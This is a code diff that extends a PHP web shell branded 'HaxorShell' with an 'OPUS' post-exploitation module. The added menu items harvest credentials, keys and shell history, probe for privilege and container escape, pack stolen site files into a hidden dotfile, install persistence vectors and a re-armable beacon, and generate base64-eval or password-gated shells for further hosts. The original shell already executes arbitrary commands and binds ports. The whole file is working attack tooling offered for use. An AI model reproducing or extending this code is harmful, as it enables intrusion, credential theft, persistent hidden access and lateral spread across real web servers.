+function opxCopy(id) {
+  var e = $(id), t = e ? (e.value !== undefined ? e.value : e.textContent) : '';
+  if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(t); } else {
+    var a = document.createElement('textarea'); a.value = t; document.body.appendChild(a); a.select();
+    try { document.execCommand('copy'); } catch (x) {}
+    document.body.removeChild(a);
+  }
+  var b = document.getElementById('opx-copy-note');
+  if (b) { b.textContent = 'copied ' + t.length + 'B'; setTimeout(function () { b.textContent = ''; }, 2500); }
+  return false;
+}
+/* file -> base64 into a textarea, for upload / write / stash */
+function opxFile(input, target, withName) {
+  var o = $(input);
+  if (!o || !o.files || !o.files[0]) { return; }
+  var r = new FileReader();
+  r.onload = function () {
+    var s = String(r.result), i = s.indexOf(',') + 1;
+    var b = s.substring(i);
+    var t = $(target);
+    if (t) { t.value = b; }
+    if (withName && $(withName)) { $(withName).value = o.files[0].name; }
+    var n = document.getElementById('opx-file-note');
+    if (n) { n.textContent = o.files[0].name + ' (' + o.files[0].size + 'B)'; }
+  };
+  r.readAsDataURL(o.files[0]);
+}</script>
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><meta content="width=device-width, initial-scale=1" name="viewport"/><style type="text/css">* {margin:0px;padding:0px;}body {background:#CCCCCC;color:#333333;font-size:13px;font-family:Verdana,Arial,SimSun,sans-serif;text-align:left;word-wrap:break-word; word-break:break-all;}a{color:#000000;text-decoration:none;vertical-align:middle;}a:hover{color:#FF0000;text-decoration:underline;}p {padding:1px;line-height:1.6em;}h1 {color:#CD3333;font-size:13px;display:inline;vertical-align:middle;}h2 {color:#008B45;font-size:13px;display:inline;vertical-align:middle;}form {display:inline;}input,select { vertical-align:middle; }input[type=text], textarea {padding:1px;font-family:Courier New,Verdana,sans-serif;}input[type=submit], input[type=button] {height:21px;}.tag {text-align:center;margin-left:10px;background:threedface;height:25px;padding-top:5px;}.tag a {background:#FAFAFA;color:#333333;width:90px;height:20px;display:inline-block;font-size:15px;font-weight:bold;padding-top:5px;}.tag a:hover, .tag a.current {background:#EEE685;color:#000000;text-decoration:none;}.main {width:963px;margin:0 auto;padding:10px;}.outl {border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;}.toptag {padding:5px;text-align:left;font-weight:bold;color:#FFFFFF;background:#293F5F;}.footag {padding:5px;text-align:center;font-weight:bold;color:#000000;background:#999999;}.msgbox {padding:5px;background:#EEE685;text-align:center;vertical-align:middle;}.actall {background:#F9F6F4;text-align:center;font-size:15px;border-bottom:1px solid #999999;padding:3px;vertical-align:middle;}.tables {width:100%;}.tables th {background:threedface;text-align:left;border-color:#FFFFFF #666666 #666666 #FFFFFF;border-style:solid;border-width:1px;padding:2px;}.tables td {background:#F9F6F4;height:19px;padding-left:2px;}.tables tr:hover td {background-color: #EEE685;}</style><script type="text/javascript">function $(ID) { return document.getElementById(ID); }function sd(str) { str = str.replace(/%22/g,'"'); str = str.replace(/%27/g,"'"); return str; }function cd(dir) { dir = sd(dir); $('dir').value = dir; $('frm').submit(); }function sa(form) { for(var i = 0;i < form.elements.length;i++) { var e = form.elements[i]; if(e.type == 'checkbox') { if(e.name != 'chkall') { e.checked = form.chkall.checked; } } } }function go(a,b) { b = sd(b); $('go').value = a; $('govar').value = b; if(a == 'editor') { $('gofrm').target = "_blank"; } else { $('gofrm').target = ""; } $('gofrm').submit(); } function nf(a,b) { re = prompt("New name",b); if(re) { $('go').value = a; $('govar').value = re; $('gofrm').submit(); } } function dels(a) { if(a == 'b') { var msg = ""; $('act').value = a; } else { var msg = ""; $('act').value = 'deltree'; $('var').value = a; } if(confirm("Are you sure you want to delete? "+msg+"")) { $('frm1').submit(); } }function txts(m,p,a) { p = sd(p); re = prompt(m,p); if(re) { $('var').value = re; $('act').value = a; $('frm1').submit(); } }function acts(p,a,f) { p = sd(p); f = sd(f); re = prompt(f,p); if(re) { $('var').value = re+'|x|'+f; $('act').value = a; $('frm1').submit(); } }</script><title><?php 
 $sitename = $_SERVER['SERVER_NAME'];
 echo $sitename .' | HaxorShell';
 ?>
 </title></head><body><div class="main"><div class="outl"><div class="toptag"><?php 
-echo $_SERVER['SERVER_ADDR'] . ' - ' . PHP_OS . ' - whoami(' . get_current_user() . ') - [uid(' . getmyuid() . ') gid(' . getmygid() . ')]';
-if (isset($issql)) {
-    echo ' - [' . $issql . ']';
+echo $_SERVER['SERVER_ADDR'] . ' - ' . PHP_OS . ' - whoami(' . get_current_user() . ') - [uid(' . @getmyuid() . ') gid(' . @getmygid() . ')]';
+/* ---- OPUS instrument bar: reads the beacon only, no extra process ---- */
+if (!function_exists('opx_bar')) {
+    function opx_bar()
+    {
+        echo '</div>';
+        opx_bar_body();
+    }
 }
-?>
-</div><?php 
-$menu = array('file' => 'File Mgr', 'scan' => 'Searcher', 'antivirus' => 'Antivirus', 'backshell' => 'Bind Port', 'exec' => 'Exec CMD', 'phpeval' => 'Exec PHP', 'sql' => 'Exec SQL', 'info' => 'System', 'gsocket' => 'GSocket');
-$go = array_key_exists($_POST['go'], $menu) ? $_POST['go'] : 'file';
-$nowdir = isset($_POST['dir']) ? strdir(chop($_POST['dir']) . '/') : THISDIR;
+if (!function_exists('opx_bar_body')) {
+    function opx_bar_body()
+    {
+$_bi = opx_beacon();
+$_id = opx_id();
+$_win = substr(PHP_OS, 0, 3) == 'WIN';
+$_cu = strtoupper((string)@get_current_user());
+$_root = ($_id['uid'] === 0) || (strtolower((string)$_id['user']) === 'root') || ($_win && ($_cu === 'SYSTEM' || substr($_cu, 0, 14) === 'NT AUTHORITY\S'));
+$_self = opx_self();
+$_spare = count(opx_spare_scan());
+echo '<div class="opxbar"><span class="led' . ($_root ? '' : ' st') . '"></span><b>OPUS</b> ' . OPX_VER;
+echo '<span class="sep">|</span>CTX ' . ($_root ? '<span class="lvl r">ROOT</span>' : '<span class="lvl">' . htmlspecialchars($_id['user']) . '</span>') . ' uid ' . ($_win ? '-' : $_id['uid']);
+echo '<span class="sep">|</span>PID <b>' . @getmypid() . '</b> ' . htmlspecialchars(@php_sapi_name());
+echo '<span class="sep">|</span>EXEC <b>' . (opx_xf() ? opx_xf() : 'NONE') . '</b>';
+echo '<span class="sep">|</span>LIMIT ' . (@ini_get('max_execution_time') ? @ini_get('max_execution_time') . 's' : '0') . '/' . (@ini_get('memory_limit') ? @ini_get('memory_limit') : '-1');
+echo '<span class="sep">|</span>' . (!empty($_bi['armed']) ? '<span class="ok">GHOST ARMED' . (!empty($_bi['rt']) ? ' RT' : '') . '</span>' : '<span class="warn">GHOST COLD</span>');
+echo '<span class="sep">|</span>SELF ' . ($_self['w'] == '-' ? '<span class="ok">LOCKED</span>' : '<span class="warn">W:' . htmlspecialchars($_self['w']) . '</span>');
+echo ' ' . $_self['perm'] . ' ' . substr($_self['sum'], 0, 8) . ($_spare ? ' <span class="ok">SPARE x' . $_spare . '</span>' : ' <span class="bad">NO-SPARE</span>');
+echo '<span class="sep">|</span>' . @date('H:i:s') . ' ' . htmlspecialchars(substr((string)@gethostname(), 0, 24)) . '</div>';
+    }
+}
+opx_bar();
+?></div>
+<?php
+$menu = array('file' => 'File Mgr', 'scan' => 'Searcher', 'antivirus' => 'Antivirus', 'backshell' => 'Bind Port', 'exec' => 'Exec CMD', 'phpeval' => 'Exec PHP', 'sql' => 'Exec SQL', 'info' => 'System', 'gsocket' => 'GSocket', 'recon' => 'Recon', 'escape' => 'Escape', 'creds' => 'Creds', 'loot' => 'Loot', 'persist' => 'Persist', 'ghost' => 'Ghost', 'arsenal' => 'Arsenal', 'payload' => 'Payload');
+$go = isset($_POST['go']) ? (string)$_POST['go'] : 'file';
+$nowdir = isset($nowdir) ? $nowdir : (isset($_POST['dir']) && $_POST['dir'] !== '' ? strdir(chop($_POST['dir']) . '/') : THISDIR);
+$hot = array('recon', 'escape', 'creds', 'loot', 'persist', 'ghost', 'arsenal', 'payload');
 echo '<div class="tag">';
 foreach ($menu as $key => $name) {
-    echo '<a' . ($go == $key ? ' class="current"' : '') . ' href="javascript:void(0);" onclick="go(\'' . $key . '\',\'' . base64_encode($nowdir) . '\');">' . $name . '</a> ';
+    $cls = array();
+    if ($go == $key) {
+        $cls[] = 'current';
+    }
+    if (in_array($key, $hot)) {
+        $cls[] = 'hot';
+    }
+    echo '<a' . ($cls ? ' class="' . implode(' ', $cls) . '"' : '') . ' href="javascript:void(0);" onclick="go(\'' . $key . '\',\'' . base64_encode($nowdir) . '\');">' . $name . '</a> ';
 }
 echo '</div>';
 echo '<form name="gofrm" id="gofrm" method="POST">';
@@ -491,7 +1825,62 @@ echo '<input type="hidden" name="go" id="go" value="">';
 echo '<input type="hidden" name="godir" id="godir" value="' . $nowdir . '">';
 echo '<input type="hidden" name="govar" id="govar" value="">';
 echo '</form>';
-switch ($_POST['go']) {
+opx_init();
+$hot = array('recon', 'escape', 'creds', 'loot', 'persist', 'ghost', 'arsenal', 'payload');
+$case = in_array($go, $hot) ? $go : 'zz_orig';
+switch ($case) {
+case "recon":
+    opx_box('Recon', 'xi_recon', 'full box context: identity, exec chain, hardening, presence', array(
+        array('Scan', $OPXJI['recon']),
+        array('Arsenal', $OPXJI['arsenal']),
+        array('Ghost', $OPXJI['ghost']),
+    ));
+    break;
+case "escape":
+    opx_box('Escape', 'xi_escape', 'privilege + container boundary probe (read-only)', array(
+        array('Probe', $OPXJI['escape']),
+        array('Creds', $OPXJI['creds']),
+    ));
+    break;
+case "creds":
+    opx_box('Creds', 'xi_creds', 'configs, keys and shell history already on disk', array(
+        array('Harvest', $OPXJI['creds']),
+    ));
+    break;
+case "loot":
+    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Loot</b> <span class="small">seals site files + identity + history into one gz dotfile</span> ';
+    echo '<input type="text" id="loot_o" value="' . htmlspecialchars(THISDIR . '.' . substr(md5(OPX_PATH . 'l'), 0, 5) . '.lz') . '" size="52" style="font-family:Consolas,monospace"> ';
+    echo '<input type="button" value="Pack" onclick="OPX.run(\'loot\',{o:$(\'loot_o\').value},\'con\')"> <span class="opx-b b">xi_loot</span></div></form>';
+    echo '<div class="opx-con" id="con"><div class="c4">ready - target path above</div></div>';
+    break;
+case "persist":
+    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Persist</b> <span class="small">independent retention vectors: cold copy, null index walker, beacon re-arm</span> ';
+    echo '<input type="button" value="Install" onclick="OPX.run(\'persist\',{op:\'add\'},\'con\')"> ';
+    echo '<input type="button" value="Clean" onclick="if(confirm(\'Remove every retention vector on this node?\')){OPX.run(\'persist\',{op:\'clean\'},\'con\')}"> <span class="opx-b r">reversible</span></div></form>';
+    echo '<div class="opx-con" id="con"><div class="c4">ready</div></div>';
+    break;
+case "ghost":
+    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Ghost</b> <span class="small">presence: arm, verify cold copies, restore front-end</span> ';
+    echo '<input type="button" value="Status" onclick="OPX.run(\'ghost\',{op:\'status\'},\'con\')"> ';
+    echo '<input type="button" value="Arm" onclick="OPX.run(\'ghost\',{op:\'arm\'},\'con\')"> ';
+    echo '<input type="button" value="Heal" onclick="OPX.run(\'ghost\',{op:\'heal\'},\'con\')"> <span class="opx-b g">durable</span></div></form>';
+    echo '<div class="opx-con" id="con"><div class="c4">ready</div></div>';
+    break;
+case "arsenal":
+    opx_box('Arsenal', 'xi_arsenal', 'binaries, interpreters, net, safe write dirs on this box', array(
+        array('Inventory', $OPXJI['arsenal']),
+    ));
+    break;
+case "payload":
+    echo '<form method="POST" onsubmit="return false;"><div class="actall"><b>Payload</b> <span class="small">generate a matching front-end for the next host</span> ';
+    echo '<select id="pl_m"><option value="raw">verbatim</option><option value="b64">base64 eval</option><option value="px">password gated</option></select> ';
+    echo '<input type="text" id="pl_k" value="" size="14" placeholder="pass (px mode)"> ';
+    echo '<input type="button" value="Build" onclick="OPX.run(\'payload\',{m:$(\'pl_m\').value,k:$(\'pl_k\').value},\'con\')"> ';
+    echo '<input type="button" value="Copy" onclick="opxCopy(\'con\')"> <span class="opx-b y">xi_payload</span></div></form>';
+    echo '<div class="opx-con" id="con" style="height:320px"><div class="c4">ready - choose a mode</div></div>';
+    break;
+case "zz_orig":
+switch ($go) {
     case "info":
         if (EXISTS_PHPINFO) {
             ob_start();
@@ -1240,10 +2629,10 @@ switch ($_POST['go']) {
         echo '<input type="hidden" name="var" id="var" value="">';
         echo '<th><a href="javascript:void(0);" onclick="cd(\'' . dirname($nowdir) . '/\');">Parent directory</a></th><th style="width:5%">Perm</th><th style="width:17%">Creation time</th><th style="width:17%">Last Changed</th><th style="width:8%">Size</th><th style="width:8%">Action</th>';
         if ($array) {
-            asort($array['dir']);
-            asort($array['file']);
+            if (isset($array['dir']) && is_array($array['dir'])) { asort($array['dir']); }
+            if (isset($array['file']) && is_array($array['file'])) { asort($array['file']); }
             $dnum = $fnum = 0;
-            foreach ($array['dir'] as $path => $name) {
+            foreach ((array)(isset($array['dir']) ? $array['dir'] : array()) as $path => $name) {
                 $prem = substr(decoct(fileperms($path)), -4);
                 $ctime = date('Y-m-d H:i:s', filectime($path));
                 $mtime = date('Y-m-d H:i:s', filemtime($path));
@@ -1258,7 +2647,7 @@ switch ($_POST['go']) {
                 echo '</tr>';
                 $dnum++;
             }
-            foreach ($array['file'] as $path => $name) {
+            foreach ((array)(isset($array['file']) ? $array['file'] : array()) as $path => $name) {
                 $prem = substr(decoct(fileperms($path)), -4);
                 $ctime = date('Y-m-d H:i:s', filectime($path));
                 $mtime = date('Y-m-d H:i:s', filemtime($path));
@@ -1663,6 +3052,8 @@ switch ($_POST['go']) {
         echo '</td></tr>';
         echo '</table></form>';
         break;
+}
+break;
 }
 ?>
 <div class="footag"><?php 
